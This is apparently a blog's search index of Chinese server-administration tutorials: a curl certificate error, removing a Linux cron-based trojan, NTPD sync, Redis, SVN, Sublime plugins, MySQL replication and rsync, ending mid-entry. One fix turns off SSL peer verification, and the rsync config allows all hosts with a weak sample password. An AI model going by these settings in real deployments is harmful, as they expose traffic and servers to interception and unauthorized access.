<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CURL(60)无法获得本地颁发者证书</title>
    <url>/2017/11/06/10.html</url>
    <content><![CDATA[<p>今天在部署一个有关微信项目的环境时，访问直接报如下错误：    <code>curl(60)SSL certificate problem：unable to get local issuer certificate.</code></p>
<a id="more"></a>
<p>此问题是由于没有配置信任的服务器HTTPS验证。默认，curl被设为不信任任何CA证书，就是不信任任何服务器的验证。因此，浏览器无法通过HTTPS访问你的服务器，而报curl(60)的错误。</p>
<p><strong>解决方法有2种：</strong></p>
<ol>
<li>如果你的内容不敏感，可以在使用curl_exec()之前跳过ssl检查项【因为笔者对这个项目的代码不熟（￣□￣｜｜），所以直接跳过这个方法】</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>下载一个 <a href="https://github.com/bagder/ca-bundle/blob/e9175fec5d0c4d42de24ed6d84a06d504d5e5a09/ca-bundle.crt" target="_blank" rel="noopener">ca-bundle.crt</a> ，放到对应的目录，在php.ini文件中配置下路径，然后重启php【此处不得不感叹一下GitHub真的是大神云集】</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl.cainfo&#x3D;&quot;绝对路径&#x2F;ca-bundle.crt&quot;</span><br></pre></td></tr></table></figure>

<hr>
<p>参考文章：<a href="https://www.cnblogs.com/loveyouyou616/p/5513384.html" target="_blank" rel="noopener">https://www.cnblogs.com/loveyouyou616/p/5513384.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>LNMP</tag>
        <tag>一键脚本</tag>
        <tag>运行环境</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 10字符串木马病毒</title>
    <url>/2017/09/15/1.html</url>
    <content><![CDATA[<p>今天客户的WAP端注册显示不知名的报错，进入网站查看。可是访问缓慢，于是进入服务器查看情况，结果SSH连接也是十分的卡。等了半天，使用命令查看负载，发现CPU达到了100%，一个10字符串的进程占据了第一的位置。二话不说直接kill掉它，可是立马有生成了另一个10字符串进程。</p>
<a id="more"></a>
<h2 id="处理步骤"><a href="#处理步骤" class="headerlink" title="处理步骤"></a>处理步骤</h2><ol>
<li>使用top命令查看服务器负载情况 </li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>既然它重新生成了，必定和定时任务脱不了干系，查看crontab</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
<p>发现有两个不知名的定时任务</p>
<blockquote>
<p>*/3 * * * * root /etc/cron.hourly/cron.sh<br>*/3 * * * * root /etc/cron.hourly/kill.sh</p>
</blockquote>
<ol start="3">
<li>查看病毒程序 <code>cron.sh</code> 和 <code>kill.sh</code> ，此处只贴出 <code>cron.sh</code> ，可以看到它的本体 <code>/lib/udev/udev</code></li>
</ol>
<blockquote>
<p>cp /lib/udev/udev /lib/udev/debug</p>
</blockquote>
<ol start="4">
<li>删除执行的脚本 <code>cron.sh</code> 和 <code>kill.sh</code> ，并设定 <code>/etc/crontab</code> 不能更改，否则木马又会生成</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf /etc/cron.hourly/cron.sh</span><br><span class="line">rm -rf /etc/cron.hourly/kill.sh</span><br><span class="line">chattr +i /etc/crontab</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>使用 <code>top</code> 查看木马为 <code>fcftrfxbuc</code> ，pid为29365，不能直接杀掉程序，否则会重生，所以需要暂停它</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kill -STOP 29365</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>删除/etc/init.d目录下所有有关木马的文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find /etc/init.d -name '*fcftrfxbuc*' | xargs rm -f</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>删除/usr/bin目录下的木马病毒</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf /usr/bin/fcftrfxbuc</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>查看/usr/bin目录下最近有变动的文件，如果是木马和可疑文件一并删除</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -lt /usr/bin | head</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>杀掉木马程序</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pkill fcftrfxbuc</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>删除木马本体</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -f /lib/udev/udev</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>木马病毒</tag>
        <tag>安全防护</tag>
      </tags>
  </entry>
  <entry>
    <title>多机部署之使用NTPD服务平滑同步时间</title>
    <url>/2017/12/24/14.html</url>
    <content><![CDATA[<p>多机部署中时间的同步是很重要的，当然有人说了搞毛啊ntpdate命令直接同步不就完事了嘛。是的，这样的确可以达到同步时间的效果，但是会有一定的隐患，具体例子这里就不说明了，自行百度。下面就来介绍一下如何使用NTPD服务平滑同步时间。</p>
<a id="more"></a>
<ol>
<li><p>检查是否安装NTPD服务</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -q ntp</span><br></pre></td></tr></table></figure>

<p> 有内容表示已经安装，如果没有，安装命令如下：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y ntp</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置NTP服务为自启动</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --list ntpd</span><br></pre></td></tr></table></figure>

<p> 显示如下内容即可</p>
<blockquote>
<p>ntpd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭</p>
</blockquote>
</li>
<li><p>使用ntpdate手动同步时间，免得时间相差太大，让ntpd不能正常同步</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpdate -u 202.112.10.36</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置内网NTP-Server(192.168.8.109)，文件位置/etc/ntpd.conf，修改部分如下（多的添，原文件默认配置不做删除，不一样的进行修改）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 允许内网其他机器同步时间</span></span><br><span class="line">restrict 192.168.8.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 中国这边最活跃的时间服务器 : http://www.pool.ntp.org/zone/cn</span></span><br><span class="line">server 210.72.145.44 perfer   # 中国国家受时中心</span><br><span class="line">server 202.112.10.36             # 1.cn.pool.ntp.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> allow update time by the upper server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许上层时间服务器主动修改本机时间</span></span><br><span class="line">restrict 210.72.145.44 nomodify notrap noquery</span><br><span class="line">restrict 202.112.10.36 nomodify notrap noquery</span><br><span class="line">restrict 59.124.196.83 nomodify notrap noquery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 外部时间服务器不可用时，以本地时间作为时间服务</span></span><br><span class="line">server  127.127.1.0     # local clock</span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启服务</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ntpd restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看服务连接和监听</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -autlnp | grep ntp</span><br></pre></td></tr></table></figure>

<p> 出现如下即可</p>
<blockquote>
<p>udp 0 0 192.168.8.109:123 0.0.0.0:* 23103/ntpd</p>
</blockquote>
</li>
<li><p>配置内网NTP-Clients，修改/etc/ntp.conf文件（此处贴出完整的不带注释的配置文件）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">driftfile /var/lib/ntp/drift</span><br><span class="line"></span><br><span class="line">restrict 127.0.0.1</span><br><span class="line">restrict -6 ::1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置时间服务器为本地的时间服务器</span></span><br><span class="line">server 192.168.8.109</span><br><span class="line">restrict 192.168.8.109 nomodify notrap noquery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server  127.127.1.0     # local clock</span><br><span class="line">fudge   127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">includefile /etc/ntp/crypto/pw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keys /etc/ntp/keys</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用ntpdate手动同步下时间</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpdate -u 192.168.8.109</span><br></pre></td></tr></table></figure>
</li>
<li><p>几个命令</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ntpq -p #查看网络中的NTP服务器</span><br><span class="line">ntpstat #查看时间同步状态</span><br></pre></td></tr></table></figure>

</li>
</ol>
<hr>
<p>参考文章：<a href="http://blog.csdn.net/xw_classmate/article/details/50611489" target="_blank" rel="noopener">http://blog.csdn.net/xw_classmate/article/details/50611489</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>多机部署</tag>
        <tag>NTPD</tag>
        <tag>时间平滑同步</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows上安装Redis</title>
    <url>/2017/11/16/11.html</url>
    <content><![CDATA[<p>对于Windows相信大家都有着一种怀旧感，所以对于刚进入编程世界的新手来说，用Windows编程编程自然而然的事了。下面笔者就来介绍一下如何在Windows上安装Redis。</p>
<a id="more"></a>
<ol>
<li><p>下载Windows版的 <a href="https://github.com/MicrosoftArchive/redis/releases" target="_blank" rel="noopener">Redis</a></p>
</li>
<li><p>解压zip压缩文件之后，使用Windows的命令提示符切换到相应的目录<br> <strong>cmd命令简介：</strong></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">abcd</span>&gt;<span class="title">d</span>:(进入<span class="title">D</span>盘)</span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">cd</span> <span class="title">phpStudy</span>\<span class="title">Redis</span>(进入<span class="title">Redis</span>目录，具体目录根据解压<span class="title">Redis</span>后放置的目录而定)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动Redis服务</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server redis.windows.conf</span><br></pre></td></tr></table></figure>

<p> <strong>如果报错：</strong></p>
<blockquote>
<p>QForkMasterInit: system error caught. error code=0x000005af, message=VirtualAllocEx failed.: unknown error 。原因是内存不够。</p>
</blockquote>
<p> <strong>解决方法：</strong><br> ① 启动时使用 <code>--maxmemory</code> 命令限制Redis的内存</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server redis.windows.conf --maxmemory <span class="number">200</span>m</span><br></pre></td></tr></table></figure>

<p> ② 修改配置文件 <code>redis.windows.conf</code></p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">maxmemory <span class="number">1073741824</span> [单位：字节(b)]</span><br></pre></td></tr></table></figure>
</li>
<li><p>部署Redis，把Redis安装成Windows服务，开机自启动</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-install redis.windows.conf</span><br></pre></td></tr></table></figure>

<p> 安装完成之后，就可以看到Redis已经作为Windows服务了</p>
<blockquote>
<p>[2852] 04 Jul 12:11:52.898 # Redis successfully installed as a service。（大约这个意思就说明成功了）</p>
</blockquote>
<p> 但安装好之后，Redis并没有启动，启动命令</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-<span class="built_in">start</span></span><br></pre></td></tr></table></figure>

<p> 停止命令</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server --service-stop</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装多个实例</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.redis-server --service-install -service-name redisService1 -port <span class="number">10001</span></span><br><span class="line"><span class="number">2</span>.redis-server --service-<span class="built_in">start</span> -service-name redisService1</span><br><span class="line"><span class="number">3</span>.redis-server --service-install -service-name redisService2 -port <span class="number">10002</span></span><br><span class="line"><span class="number">4</span>.redis-server --service-<span class="built_in">start</span> -service-name redisService2</span><br></pre></td></tr></table></figure>
</li>
<li><p>卸载命令</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">redis-server -service-uninstall</span><br></pre></td></tr></table></figure>

</li>
</ol>
<hr>
<p>参考文章：<a href="https://www.cnblogs.com/smileyearn/articles/4749746.html" target="_blank" rel="noopener">https://www.cnblogs.com/smileyearn/articles/4749746.html</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>SVN服务器搭建（简篇）</title>
    <url>/2017/12/05/12.html</url>
    <content><![CDATA[<p>Subversion是一个自由开源的版本控制系统，相对于RCS、CVS，采用了分支管理系统。SVN实现多个人共同开发同一个项目，共用资源的目的。</p>
<a id="more"></a>
<ol>
<li><p>安装apache（已装请忽略）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y httpd</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装SVN主程序和apache扩展</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y subversion mod_dav_svn</span><br></pre></td></tr></table></figure>
</li>
<li><p>建立SVN库，创建项目目录</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /var/www/svn</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建版本库</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/svn</span><br><span class="line">svnadmin create ceshi</span><br></pre></td></tr></table></figure>

<p> 创建之后有这几个文件夹和文件</p>
<blockquote>
<p>conf db format hooks locks README.txt</p>
</blockquote>
</li>
<li><p>添加账号</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">htpasswd -cmb /var/www/svn/passwd nsxsg nsxsg2333</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置权限</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R apache:apache /var/www/svn</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 <code>subversion.conf</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/httpd/conf.d/subversion.conf</span><br></pre></td></tr></table></figure>

<p> <strong>如下：</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Location &#x2F;ceshi&gt;</span><br><span class="line">	DAV svn</span><br><span class="line">	SVNPath &#x2F;var&#x2F;www&#x2F;svn&#x2F;ceshi</span><br><span class="line">	Require valid-user</span><br><span class="line">	AuthType basic</span><br><span class="line">	AuthName &quot;Subversion&quot;</span><br><span class="line">	AuthUserFile &#x2F;var&#x2F;www&#x2F;svn&#x2F;passwd</span><br><span class="line">&lt;&#x2F;Location&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启apache</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/httpd restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>访问http://[ip或者域名]/ceshi 即可</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime自定义快捷键（绑定插件）</title>
    <url>/2017/12/07/13.html</url>
    <content><![CDATA[<p>大家在使用Sublime的时候，是不是对于打印一些数据流的函数既爱又恨。爱的是这个东西对于排错和修改BUG是真的很有用，恨的是这个东西每次打起来是又多又长。那今天小编就介绍一种插件和快捷键结合的方法，快速输出打印函数。</p>
<a id="more"></a>
<ol>
<li><p>新增插件</p>
<blockquote>
<p>操作流程：工具（T）-&gt; 插件开发 -&gt; 新建插件</p>
</blockquote>
<p> 之后会有一个untitled文件，内容如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sublime, sublime_plugin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExampleCommand</span><span class="params">(sublime_plugin.TextCommand)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, edit)</span>:</span></span><br><span class="line">        self.view.insert(edit, <span class="number">0</span>, “Hello, World!”)</span><br></pre></td></tr></table></figure>

<p> 这个代码什么意思哪，小编也不知道，但是没关系，不用懂它，知道怎么借鉴就可以了。大致意思如下：<code>class ExampleCommand()</code> 这个是一个类，也是我们接下来要用的。也和之后绑定快捷键有关，它是以大写字母来区分如何调用这个类名。</p>
<p> <strong>比如：</strong><br> <code>ExampleCommand</code>这个类名，之后调用就用 <code>example</code> ；<code>EchoVdCommand</code> 这个类名，之后调用就用 <code>echo_vd</code>。</p>
</li>
<li><p>编辑插件<br> <strong>具体内容如下：</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sublime, sublime_plugin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoVdCommand</span><span class="params">(sublime_plugin.TextCommand)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, edit)</span>:</span></span><br><span class="line">        self.view.run_command(<span class="string">"insert_snippet"</span>,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">"contents"</span>:<span class="string">"echo '&lt;pre&gt;';var_dump(\$content);exit;"</span></span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileVdCommand</span><span class="params">(sublime_plugin.TextCommand)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, edit)</span>:</span></span><br><span class="line">        self.view.run_command(<span class="string">"insert_snippet"</span>,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">"contents"</span>:<span class="string">"file_put_contents(DATA_DIR.'/abcd.log',print_r(\$content,true),FILE_APPEND);"</span></span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br></pre></td></tr></table></figure>

<p> 不用管这个是啥意思，只要记住类名（<code>EchoVdCommand、FileVdCommand</code>）和内容（<code>“echo ‘&lt;pre&gt;’;var_dump(content);exit;”、“file_put_contents(DATA_DIR.’/abcd.log’,print_r(content,true),FILE_APPEND);”</code>）</p>
</li>
<li><p>保存插件<br> 插件名随便，不要和其它文件重复就可以了。</p>
</li>
<li><p>绑定快捷键</p>
<blockquote>
<p>操作步骤：首选项（N）-&gt; 按键绑定-用户</p>
</blockquote>
<p> 如果没有“按键绑定-用户”，那就安装一个 <code>Emmet插件</code>（如何安装自行百度） 出现如下内容：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123; &quot;keys&quot;: [&quot;alt+m&quot;], &quot;command&quot;: &quot;markdown_preview&quot;, &quot;args&quot;: &#123;&quot;target&quot;: &quot;browser&quot;, &quot;parser&quot;:&quot;markdown&quot;&#125; &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p> 然后编辑内容，结果如下：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123; &quot;keys&quot;: [&quot;alt+m&quot;], &quot;command&quot;: &quot;markdown_preview&quot;, &quot;args&quot;: &#123;&quot;target&quot;: &quot;browser&quot;, &quot;parser&quot;:&quot;markdown&quot;&#125; &#125;,</span><br><span class="line">    &#123; &quot;keys&quot;: [&quot;alt+e&quot;], &quot;command&quot;: &quot;echo_vd&quot; &#125;,</span><br><span class="line">    &#123; &quot;keys&quot;: [&quot;alt+f&quot;], &quot;command&quot;: &quot;file_vd&quot; &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p> 为啥是这样我也不知道，不过大致可以理解为，使用 <code>“alt+e”</code> 键，调用 <code>echo_vd</code> （即对应刚才编辑的<code>EchoVdCommand</code>类） 注：按键 <code>“alt+e”</code> 、<code>“alt+f”</code> 可自定义，但不能与其它按键冲突</p>
</li>
<li><p>试验</p>
<p> 使用 <code>“alt+e”</code> 键，输出</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;pre&gt;&#39;;var_dump($content);</span><br></pre></td></tr></table></figure>

<p> 使用 <code>“alt+f”</code> 键，输出</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_put_contents(DATA_DIR.&#39;&#x2F;abcd.log&#39;,print_r($content,true),FILE_APPEND);</span><br></pre></td></tr></table></figure>

<p> 出现这样的结果那么即成功。</p>
</li>
</ol>
<hr>
<p>参考文章：<a href="https://jinjiajin.net/792.html" target="_blank" rel="noopener">https://jinjiajin.net/792.html</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Sublime</tag>
        <tag>快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title>多机部署之MySQL主从配置</title>
    <url>/2018/01/01/17.html</url>
    <content><![CDATA[<p>MySQL的主从配置可以让我们很好地减轻数据库的压力而完成更多的业务需求，下面笔者就来介绍一下简单的MySQL主从配置。</p>
<a id="more"></a>
<ol>
<li>主（从）服务器配置，修改配置文件 <code>/etc/my.cnf</code> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin #[必须]启用二进制日志</span><br><span class="line">server-id=110     #[必须]服务器唯一ID，默认是1，一般取IP最后一段</span><br></pre></td></tr></table></figure></li>
<li>重启数据库 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysqld restart</span><br></pre></td></tr></table></figure></li>
<li>登陆主服务器，给从服务器授权 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; GRANT REPLICATION SLAVE ON *.* TO '用户名'@'从服务器IP' identified by '密码';</span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否添加成功</span></span><br><span class="line">mysql &gt; SELECT user,host,password FROM mysql.user;</span><br></pre></td></tr></table></figure></li>
<li>查看主数据库状态 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; show master status;</span><br><span class="line"></span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">| mysql-bin.000001 | 640 | | | |</span><br><span class="line">+——————+———-+————–+——————+——————-+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">这里需要记录File以及Position的值，在操作从服务器时会用到</span></span><br></pre></td></tr></table></figure></li>
<li>登陆从数据库 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">执行sql</span></span><br><span class="line">mysql &gt; change master to master_host='主数据库ip',master_user='数据库登陆用户名',master_password='数据库登陆密码',master_log_file='mysql-bin.000001',master_log_pos=640;</span><br><span class="line"><span class="meta">#</span><span class="bash">启动同步进程</span></span><br><span class="line">mysql &gt; start slave;</span><br><span class="line"><span class="meta">#</span><span class="bash">主从同步检查</span></span><br><span class="line">mysql &gt; show slave status\G</span><br><span class="line"><span class="meta">#</span><span class="bash">可以看到：Slave_IO_Running | Slave_SQL_Running两个值都是YES，说明配置成功了</span></span><br></pre></td></tr></table></figure></li>
<li>主从服务器测试 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">主服务器MySQL，建立数据库，并在这个库中建表插入一条数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash">从服务器查看是否拥有此数据</span></span><br></pre></td></tr></table></figure></li>
<li>MySQL主服务器给web服务器授权访问 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql &gt; GRANT ALL PRIVILEGES  ON 数据库名.* to '用户名'@'web服务器ip' identified by '密码';</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>多机部署</tag>
        <tag>MySQL主从配置</tag>
      </tags>
  </entry>
  <entry>
    <title>多机部署之使用rsync+inotify实时双向同步代码</title>
    <url>/2017/12/24/15.html</url>
    <content><![CDATA[<p>rsync可以实现触发式的文件同步，但是通过crontab守护进程方式进行触发，同步的数据和实际数据会有差异，而inotify可以监控文件系统的各种变化，当文件有任何变动时，就触发rsync同步，这样刚好解决了同步数据的实时性问题。</p>
<a id="more"></a>
<ol>
<li><p>安装rsync(两台服务器都要装)</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y rsync</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建或者修改 <code>/etc/rsyncd.conf</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">rsync通用配置文件,配置的注释不要写在配置后面，否则会有问题</span></span><br><span class="line">uid = root</span><br><span class="line">gid = root</span><br><span class="line">use chroot = 0</span><br><span class="line">port = 873</span><br><span class="line"><span class="meta">#</span><span class="bash">允许ip访问设置，请根据实际需要进行配置,这里为了方便设为全网段 *,生产环境下为了安全请指定ip或ip段</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hosts allow = 192.168.0.1/255.255.255.0 198.162.145.1 10.0.1.0/255.255.255.0</span></span><br><span class="line">hosts allow = *</span><br><span class="line">max connections = 0</span><br><span class="line">timeout = 300</span><br><span class="line">pid file = /var/run/rsyncd.pid</span><br><span class="line">lock file = /var/run/rsyncd.lock</span><br><span class="line">log file = /var/log/rsyncd.log</span><br><span class="line">log format = %t %a %m %f %b</span><br><span class="line">transfer logging = yes</span><br><span class="line">syslog facility = local3</span><br><span class="line"><span class="meta">#</span><span class="bash">方括号中为模块声明，对应命名,这里master_web对应了主web机配置,从服务器可都为[slave_web]，方便inotify脚本配置</span></span><br><span class="line">[master_web]</span><br><span class="line"><span class="meta">#</span><span class="bash">指定当前模块在rsync服务器上的同步路径，该参数是必须指定的</span></span><br><span class="line">path = /home/wwwroot/</span><br><span class="line"><span class="meta">#</span><span class="bash">注释，可以同模块名一样,从服务器可都为slave_web</span></span><br><span class="line">comment = master_web</span><br><span class="line">ignore errors</span><br><span class="line"><span class="meta">#</span><span class="bash">是否允许客户端上传文件</span></span><br><span class="line">read only = no</span><br><span class="line">list = no</span><br><span class="line"><span class="meta">#</span><span class="bash">指定由空格或逗号分隔的用户名列表，只有这些用户才允许连接该模块</span></span><br><span class="line">auth users = rsync</span><br><span class="line"><span class="meta">#</span><span class="bash">保存密码和用户名文件，需要自己生成</span></span><br><span class="line">secrets file = /etc/rsyncd.passwd</span><br></pre></td></tr></table></figure></li>
<li><p>创建或者修改 <code>/etc/rsyncd.passwd和/root/rsyncd.passwd</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">/etc/rsyncd.passwd中内容格式 用户名:密码 ，多个用户名密码则每添加多行，建议从web机都是一样的用户名和密码</span></span><br><span class="line">rsync:123456</span><br><span class="line"><span class="meta">#</span><span class="bash">/root/rsyncd.passwd中内容只需要填写从服务器的密码，例如这里从服务器配的用户名密码都是rsync:123456，这里主服务器则写123456一个就可以了</span></span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
</li>
<li><p>给文件赋权限</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 600 /etc/rsyncd.passwd</span><br><span class="line">chmod 600 /root/rsyncd.passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p>以守护进程方式启动rsync服务</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/rsync --daemon --config=/etc/rsyncd.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加开机自启动</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "/usr/bin/rsync --daemon --config=/etc/rsyncd.conf"&gt;&gt;/etc/rc.local</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证代码是否同步</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主web服务器推送代码到从web服务器，命令中的</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rsync@192.168.10.230::slave_web<span class="comment"># 192.168.10.230 为从web服务器的ip,</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> slave_web 为从web服务器的 rsyncd.conf 中配置的模块名，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rsync 为为从web服务器的中 rsyncd.passwd 中配置的用户名</span></span><br><span class="line">rsync -vzrtopg --delete --progress /home/wwwroot/ rsync@192.168.10.230::slave_web --password-file=/root/rsyncd.passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装inotify(两台服务器都要安装)</p>
